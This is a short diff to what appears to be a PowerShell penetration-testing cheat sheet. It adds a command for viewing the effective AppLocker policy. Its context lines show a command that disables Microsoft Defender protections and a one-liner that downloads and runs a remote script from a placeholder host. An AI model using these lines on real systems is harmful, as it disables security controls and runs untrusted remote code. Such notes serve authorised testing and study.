@@ -53,3 +53,7 @@ Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection 
 Invoke-Expression -Command (Invoke-WebRequest -Uri 'http://ipaddress/script.ps1').Content
 ```
 
+- View Applocker Policy
+```powershell
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
